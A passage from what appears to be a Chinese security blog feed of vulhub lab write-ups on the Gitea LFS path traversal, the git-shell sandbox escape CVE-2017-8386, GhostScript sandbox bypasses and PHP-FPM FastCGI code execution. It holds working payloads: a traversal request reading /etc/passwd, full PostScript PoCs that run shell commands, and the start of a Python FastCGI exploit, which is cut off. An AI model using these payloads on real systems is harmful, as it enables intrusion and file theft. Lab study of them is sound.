LFS对象。</p><p>这个LFS对象可以通过<code>http://example.com/vulhub/repo.git/info/lfs/objects/[oid]</code>这样的接口来访问，比如下载、写入内容等。其中<code>[oid]</code>是LFS对象的ID，通常来说是一个哈希，但gitea中并没有限制这个ID允许包含的字符，这也是导致第二个漏洞的根本原因。</p><p>我们利用第一个漏洞，先发送一个数据包，创建一个Oid为<code>....../../../etc/passwd</code>的LFS对象：</p><pre class=" language-http"><code class="language-http">POST /vulhub/repo.git/info/lfs/objects HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:3000<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> application/vnd.git-lfs+json<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> application/json<span class="token header-name keyword">Content-Length:</span> 151<span class="token application/json"><span class="token punctuation">{</span>    <span class="token string">"Oid"</span><span class="token punctuation">:</span> <span class="token string">"....../../../etc/passwd"</span><span class="token punctuation">,</span>    <span class="token string">"Size"</span><span class="token punctuation">:</span> <span class="token number">1000000</span><span class="token punctuation">,</span>    <span class="token string">"User"</span> <span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>    <span class="token string">"Password"</span> <span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>    <span class="token string">"Repo"</span> <span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>    <span class="token string">"Authorization"</span> <span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">}</span></span></code></pre><p>其中，vulhub/repo是一个公开的项目。</p><blockquote><p>也就是说，这个漏洞的利用是有条件的，第一个条件就是需要有一个公开项目。为什么呢？虽然“创建LFS对象”接口有权限绕过漏洞，但是“读取这个对象所代表的文件”接口没有漏洞，会先检查你是否有权限访问这个LFS对象所在的项目。只有公开项目才有权限读取。</p></blockquote><p>见下图，发送数据包后，虽然返回了401状态码，但实际上这个LFS对象已经创建成功，且其Oid为<code>....../../../etc/passwd</code>。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615143217.png-water_print" alt=""></p><p>第二步，就是访问这个对象。访问方法就是GET请求<a href="http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sth" target="_blank" rel="noopener">http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sth</a>，oid就是刚才指定的，这里要用url编码一下。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615144004.png-water_print" alt=""></p><p>研究一下原理：<br>代码 modules/lfs/content_store.go ：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615144513.png-water_print" alt=""></p><p>可见，<code>meta.Oid</code>被传入<code>transformKey</code>函数，这个函数里，将<code>Oid</code>转换成了<code>key[0:2]/key[2:4]/key[4:]</code>这样的形式，前两个、中间两个字符做为目录名，第四个字符以后的内容作为文件名。</p><p>那么，我创建的<code>Oid</code>为<code>....../../../etc/passwd</code>，在经过<code>transformKey</code>函数后就变成了<code>../../../../../etc/passwd</code>，s.BasePath是LFS对象的基础目录，二者拼接后自然就读取到了<code>/etc/passwd</code>文件。</p><p>这就是第二个漏洞：目录穿越。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Gitea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIT-SHELL 沙盒绕过（CVE-2017-8386）</title>
      <link href="/2019/02/16/git-shell-sha-he-rao-guo/"/>
      <url>/2019/02/16/git-shell-sha-he-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="GIT-SHELL-沙盒绕过（CVE-2017-8386）"><a href="#GIT-SHELL-沙盒绕过（CVE-2017-8386）" class="headerlink" title="GIT-SHELL 沙盒绕过（CVE-2017-8386）"></a>GIT-SHELL 沙盒绕过（CVE-2017-8386）</h1><p>GIT-SHELL 沙盒绕过（CVE-2017-8386）导致任意文件读取、可能的任意命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/" target="_blank" rel="noopener">https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/</a></li><li><a href="https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html</a></li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="基于ssh协议的git拉取流程"><a href="#基于ssh协议的git拉取流程" class="headerlink" title="基于ssh协议的git拉取流程"></a>基于ssh协议的git拉取流程</h3><p>git-shell是git服务中重要的组成部分，众所周知，git服务支持ssh、git、https三种协议来传递项目，其中ssh是最安全，也最方便的一种方式。</p><p>我们随便打开Github上一个项目，找到<code>Clone with SSH</code>里列出的地址:<code>Geekby/vulhub.git</code>，这个url就是告诉git，ssh用户名是git，地址是github.com（默认端口是22），该项目位于Geekby/vulhub.git这个目录下；然后git就通过ssh协议连接上github.com，并将对应目录下的项目拉取下来。</p><p>所以，基于ssh协议的git clone等操作，本质上就是通过ssh协议连接上git服务器，并将指定目录拉取下来的过程。</p><p>那么，既然这个过程是个ssh交互的过程，那么我直接执行ssh <code>git@github.com</code>是不是就可以登录github服务器了呢？显然是不行的。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613163242.png-water_print" alt=""></p><p>说“不行”其实也有偏差，实际上我确实是连接上了其ssh服务，并验证身份通过了，但他给了我一段提示信息<code>“Hi Geekby! You've successfully authenticated, but GitHub does not provide shell access.”</code>，就把我的连接关了。</p><p>所以，正常来说，基于ssh的git拉取过程对于git服务器是安全的。</p><h3 id="如何禁止git用户执行系统shell"><a href="#如何禁止git用户执行系统shell" class="headerlink" title="如何禁止git用户执行系统shell"></a>如何禁止git用户执行系统shell</h3><p>那么，github这类git服务商是怎么实现上述“安全”通信的流程的呢？</p><p>让用户可以通过ssh认证身份，但又不给用户shell，这个过程有两种方法实现：</p><ol><li>创建系统用户<code>git</code>的时候将其<code>shell</code>设置成<code>git-shell</code></li><li>在<code>authorized_keys</code>文件每个<code>ssh-key</code>的前面设置<code>command</code>，覆盖或劫持重写原本的命令</li></ol><p>第一种方法比较直观，就是创建用户的时候不给其正常的<code>bash</code>或<code>sh</code>的shell，而是给它一个<code>git-shell</code>。<code>git-shell</code>是一个沙盒环境，在git-shell下，只允许执行沙盒内包含的命令。</p><p>第二种方法不仅在git服务器上使用，很多Linux发行版也会用到。比如<code>aws</code>，默认安装后是不允许root登录的，实现方法就是在<code>/root/.ssh/authorized_keys</code>中设置<code>command="echo 'Please login as the user \"ec2-user\" rather than the user \"root\".';echo;sleep 10"</code>。这句话相当于覆盖了原本执行的shell，变成了echo一段文字。</p><p>当然，第二种方法内也可以用git-shell，比如在添加git用户的时候赋予其正常的<code>/bin/bash</code>，但在authorized_keys中设置<code>command="git-shell -c \"$SSH_ORIGINAL_COMMAND\""</code>，实际上还是使用了git-shell。</p><h3 id="git-shell-沙盒绕过漏洞（CVE-2017-8386）"><a href="#git-shell-沙盒绕过漏洞（CVE-2017-8386）" class="headerlink" title="git-shell 沙盒绕过漏洞（CVE-2017-8386）"></a>git-shell 沙盒绕过漏洞（CVE-2017-8386）</h3><p>git-shell是一个可以限制用户执行命令的shell，如果我们在git用户家目录下创建一个新目录，叫<code>git-shell-commands</code>，然后将你允许用户执行的命令放在这个目录下，这就创建好了一个沙盒。在git-shell中，只能执行<code>/home/git/git-shell-commands</code>目录下的命令。</p><p>如果系统是没有<code>git-shell-commands</code>目录，那么<code>git-shell</code>默认只允许执行如下三个命令：</p><ul><li>git-receive-pack <argument></argument></li><li>git-upload-pack <argument></argument></li><li>git-upload-archive <argument></argument></li></ul><p>这就是白名单。</p><p>但CVE-2017-8386的作者发现，执行<code>git-upload-archive --help</code>（或<code>git-receive-pack --help</code>），将会进入一个交互式的man页面，man又调用了less命令，最后是一个可以上下翻页的帮助文档。</p><p>本来这也没什么，但是，less命令有一个特性，就是其支持一些交互式的方法。比如在less页面中，按shift+e可以打开Examine功能，通过这个功能可以读取任意文件；输入!id就可以执行id这个命令。</p><p>可以随便找台linux计算机试一下，执行less /etc/passwd来到less的页面，然后在英文输入法下输入!id，就可以执行id命令：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613163300.png-water_print" alt=""></p><p>所以，利用这个特性，我们就可以绕过git-shell的沙盒读取任意文件，或执行任意命令了！</p><p>我们可以先试试，在Linux下直接执行<code>git-receive-pack --help</code>，再输入<code>!id</code>，看到的效果和上图是类似的。</p><h2 id="通过ssh进行利用"><a href="#通过ssh进行利用" class="headerlink" title="通过ssh进行利用"></a>通过ssh进行利用</h2><p>那么，如何远程利用这个漏洞？</p><p>我们前面试了，直接<code>ssh git@gitserver</code>只能拿到<code>git-shell</code>（或返回一段提醒文字），我们就利用上一节里提到的沙盒绕过漏洞执行命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -p 3322 -i id_rsa -t git@127.0.0.1 <span class="token string">"git-upload-archive '--help'"</span></code></pre><p>进入帮助页面，然后按shift+e或!id即可。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613163315.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613163321.png-water_print" alt=""></p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>通常，一般配置git用户，不让ssh拥有shell，有两种方法：一是创建用户的时候设置其shell为<code>/usr/bin/git-shell</code>，二是在authorized_keys中覆盖command。</p><p>如果目标服务器使用了第一种方法，我们即使成功执行了<code>git-upload-archive '--help'</code>进入帮助页面，也不能执行命令。因为<code>!id</code>还是在git-shell下执行，git-shell中没有<code>id</code>命令，所以依旧执行不成功。</p><p>但读取文件是一定可以的，因为读取文件不是通过命令读取的，所以不受git-shell沙盒的影响。</p><p>如果目标服务器是用第二种方法配置的git-shell，比如我这里这个测试环境，我是在<code>/etc/passwd</code>文件设置git用户的shell是bash，而在authorized_keys中覆盖command，执行git-shell。</p><p>这种情况下，如果我进入了帮助页面，输入<code>!id</code>是可以成功执行id命令的，因为此时id是在bash下执行的，而不是在git-shell下执行的，所以没有沙盒限制。</p><p>总的来说，这个漏洞至少能做到任意文件读取，有可能可以执行任意命令。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> GIT-SHELL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</title>
      <link href="/2019/02/16/ghostscript-sha-xiang-rao-guo-ming-ling-zhi-xing-lou-dong-cve-2019-6116/"/>
      <url>/2019/02/16/ghostscript-sha-xiang-rao-guo-ming-ling-zhi-xing-lou-dong-cve-2019-6116/</url>
      
        <content type="html"><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h1><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>%!PS% extract .actual_pdfpaintproc operator from pdfdict/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def/exploit {    (Stage 11: Exploitation...)=    /forceput exch def    systemdict /SAFER false forceput    userparams /LockFilePermissions false forceput    systemdict /userparams get /PermitFileControl [(*)] forceput    systemdict /userparams get /PermitFileWriting [(*)] forceput    systemdict /userparams get /PermitFileReading [(*)] forceput    % update    save restore    % All done.    stop} deferrordict /typecheck {    /typecount typecount 1 add def    (Stage 10: /typecheck #)=only typecount ==    % The first error will be the .knownget, which we handle and setup the    % stack. The second error will be the ifelse (missing boolean), and then we    % dump the operands.    typecount 1 eq { null } if    typecount 2 eq { pop 7 get exploit } if    typecount 3 eq { (unexpected)= quit }  if} put% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some% executable errays onto the operand stack that contain .forceput, but are not% marked as executeonly or pseudo-operators.%% The routine was attempting to pass them to ifelse, but we can cause that to% fail because when the routine was declared, it used `bind` but many of the% names it uses are not operators and so are just looked up in the dictstack.%% This means we can push a dict onto the dictstack and control how the routine% works.&lt;&lt;    /typecount      0    /PDFfile        { (Stage 0: PDFfile)= currentfile }    /q              { (Stage 1: q)= } % no-op    /oget           { (Stage 3: oget)= pop pop 0 } % clear stack    /pdfemptycount  { (Stage 4: pdfemptycount)= } % no-op    /gput           { (Stage 5: gput)= }  % no-op    /resolvestream  { (Stage 6: resolvestream)= } % no-op    /pdfopdict      { (Stage 7: pdfopdict)= } % no-op    /.pdfruncontext { (Stage 8: .pdfruncontext)= 0 1 mark } % satisfy counttomark and index    /pdfdict        { (Stage 9: pdfdict)=        % cause a /typecheck error we handle above        true    }&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; { .actual_pdfpaintproc } stopped pop(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=% Demonstrate reading a file we shouldnt have access to.(/etc/passwd) (r) file dup 64 string readline pop == closefile(Attempting to execute a shell command...)= flush% run command(%pipe%id &gt; /tmp/success) (w) file closefile(All done.)=quit</code></pre><p>上传这个文件，即可执行<code>id &gt; /tmp/success</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613154839.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> GhostScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GhostScript 沙箱绕过（命令执行）漏洞</title>
      <link href="/2019/02/16/ghostscript-sha-xiang-rao-guo-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/02/16/ghostscript-sha-xiang-rao-guo-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</h1><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p><p>8月21号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞：</p><ul><li><a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">http://seclists.org/oss-sec/2018/q3/142</a></li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传<code>exp.png</code>，将执行命令<code>touch /tmp/success</code>。<br>exp.png:</p><pre><code>%!PSuserdict /setpagedevice undefsavelegal{ null restore } stopped { pop } if{ legal } stopped { pop } ifrestoremark /OutputFile (%pipe%touch /tmp/success) currentdevice putdeviceprops</code></pre><p>可见，命令成功执行。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613154019.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> GhostScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM Fastcgi 未授权访问漏洞</title>
      <link href="/2019/02/16/php-fpm-fastcgi-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2019/02/16/php-fpm-fastcgi-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-FPM-Fastcgi-未授权访问漏洞"><a href="#PHP-FPM-Fastcgi-未授权访问漏洞" class="headerlink" title="PHP-FPM Fastcgi 未授权访问漏洞"></a>PHP-FPM Fastcgi 未授权访问漏洞</h1><h2 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h2><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><pre class=" language-C++"><code class="language-C++">typedef struct {  /* Header */  unsigned char version; // 版本  unsigned char type; // 本次record的类型  unsigned char requestIdB1; // 本次record对应的请求id  unsigned char requestIdB0;  unsigned char contentLengthB1; // body体的大小  unsigned char contentLengthB0;  unsigned char paddingLength; // 额外块大小  unsigned char reserved;   /* Body */  unsigned char contentData[contentLength];  unsigned char paddingData[paddingLength];} FCGI_Record;</code></pre><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志<code>id</code>，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示<code>body</code>的大小。</p><p>语言端解析了<code>fastcgi</code>头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是<code>body</code>体。</p><p><code>Body</code>后面还有一段额外的数据（Padding），其长度由头中的<code>paddingLength</code>指定，起保留作用。不需要该<code>Padding</code>的时候，将其长度设置为0即可。</p><p>可见，一个<code>fastcgi record</code>结构最大支持的<code>body</code>大小是<code>2^16</code>，也就是65536字节。</p><h3 id="PHP-FPM（FastCGI进程管理器）"><a href="#PHP-FPM（FastCGI进程管理器）" class="headerlink" title="PHP-FPM（FastCGI进程管理器）"></a>PHP-FPM（FastCGI进程管理器）</h3><p>那么，PHP-FPM又是什么东西？</p><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p><p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    'GATEWAY_INTERFACE'<span class="token operator">:</span> 'FastCGI/<span class="token number">1.0</span>'<span class="token punctuation">,</span>    'REQUEST_METHOD'<span class="token operator">:</span> 'GET'<span class="token punctuation">,</span>    'SCRIPT_FILENAME'<span class="token operator">:</span> '/var/www/html/index.php'<span class="token punctuation">,</span>    'SCRIPT_NAME'<span class="token operator">:</span> '/index.php'<span class="token punctuation">,</span>    'QUERY_STRING'<span class="token operator">:</span> '?a=<span class="token number">1</span>&amp;b=<span class="token number">2</span>'<span class="token punctuation">,</span>    'REQUEST_URI'<span class="token operator">:</span> '/index.php?a=<span class="token number">1</span>&amp;b=<span class="token number">2</span>'<span class="token punctuation">,</span>    'DOCUMENT_ROOT'<span class="token operator">:</span> '/var/www/html'<span class="token punctuation">,</span>    'SERVER_SOFTWARE'<span class="token operator">:</span> 'php/fcgiclient'<span class="token punctuation">,</span>    'REMOTE_ADDR'<span class="token operator">:</span> '<span class="token number">127.0</span>.<span class="token number">0.1</span>'<span class="token punctuation">,</span>    'REMOTE_PORT'<span class="token operator">:</span> '<span class="token number">12345</span>'<span class="token punctuation">,</span>    'SERVER_ADDR'<span class="token operator">:</span> '<span class="token number">127.0</span>.<span class="token number">0.1</span>'<span class="token punctuation">,</span>    'SERVER_PORT'<span class="token operator">:</span> '<span class="token number">80</span>'<span class="token punctuation">,</span>    'SERVER_NAME'<span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>    'SERVER_PROTOCOL'<span class="token operator">:</span> 'HTTP/<span class="token number">1.1</span>'<span class="token punctuation">}</span></code></pre><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。</p><p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。</p><h3 id="Nginx（IIS7）解析漏洞"><a href="#Nginx（IIS7）解析漏洞" class="headerlink" title="Nginx（IIS7）解析漏洞"></a>Nginx（IIS7）解析漏洞</h3><p>Nginx和IIS7曾经出现过一个PHP相关的解析漏洞<a href="https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability" target="_blank" rel="noopener">测试环境</a>，该漏洞现象是，在用户访问<a href="http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析了。" target="_blank" rel="noopener">http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析了。</a></p><p>用户请求<a href="http://127.0.0.1/favicon.ico/.php，nginx将会发送如下环境变量到fpm里：" target="_blank" rel="noopener">http://127.0.0.1/favicon.ico/.php，nginx将会发送如下环境变量到fpm里：</a></p><pre class=" language-JSON"><code class="language-JSON">{    ...    'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',    'SCRIPT_NAME': '/favicon.ico/.php',    'REQUEST_URI': '/favicon.ico/.php',    'DOCUMENT_ROOT': '/var/www/html',    ...}</code></pre><p>正常来说，<code>SCRIPT_FILENAME</code>的值是一个不存在的文件<code>/var/www/html/favicon.ico/.php</code>，是PHP设置中的一个选项<code>fix_pathinfo</code>导致了这个漏洞。PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，fpm会判断<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p><p>所以，第一次fpm发现<code>/var/www/html/favicon.ico/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>/var/www/html/favicon.ico</code>是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p><p>正确的解决方法有两种，一是在Nginx端使用<code>fastcgi_split_path_info</code>将<code>path info</code>信息去除后，用<code>tryfiles</code>判断文件是否存在；二是借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析。</p><h3 id="security-limit-extensions配置"><a href="#security-limit-extensions配置" class="headerlink" title="security.limit_extensions配置"></a>security.limit_extensions配置</h3><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>此时，SCRIPT_FILENAME的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404</p><p>在fpm某个版本之前，我们可以将<code>SCRIPT_FILENAME</code>的值指定为任意后缀文件，比如<code>/etc/passwd</code>；但后来，fpm的默认配置中增加了一个选项<code>security.limit_extensions</code>：</p><pre><code>; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions = .php .php3 .php4 .php5 .php7</code></pre><p>其限定了只有某些后缀的文件允许被fpm执行，默认是<code>.php</code>。所以，当我们再传入<code>/etc/passwd</code>的时候，将会返回<code>Access denied</code>.</p><p>由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p><p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用<code>find / -name "*.php"</code>来全局搜索一下默认环境：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613142630.png-water_print" alt=""></p><p>找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</p><h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p><p>理论上当然是不可以的，即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p><p>但PHP是一门强大的语言，<code>PHP.INI</code>中有两个有趣的配置项，<code>auto_prepend_file和auto_append_file</code>。</p><p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p><p>那么就有趣了，假设我们设置<code>auto_prepend_file为php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</p><p>那么，我们怎么设置<code>auto_prepend_file</code>的值？</p><p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p><p>所以，我们最后传入如下环境变量：</p><pre class=" language-JSON"><code class="language-JSON">{    'GATEWAY_INTERFACE': 'FastCGI/1.0',    'REQUEST_METHOD': 'GET',    'SCRIPT_FILENAME': '/var/www/html/index.php',    'SCRIPT_NAME': '/index.php',    'QUERY_STRING': '?a=1&b=2',    'REQUEST_URI': '/index.php?a=1&b=2',    'DOCUMENT_ROOT': '/var/www/html',    'SERVER_SOFTWARE': 'php/fcgiclient',    'REMOTE_ADDR': '127.0.0.1',    'REMOTE_PORT': '12345',    'SERVER_ADDR': '127.0.0.1',    'SERVER_PORT': '80',    'SERVER_NAME': "localhost",    'SERVER_PROTOCOL': 'HTTP/1.1'    'PHP_VALUE': 'auto_prepend_file = php://input',    'PHP_ADMIN_VALUE': 'allow_url_include = On'}</code></pre><p>设置<code>auto_prepend_file = php://input且allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> random<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOPY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span 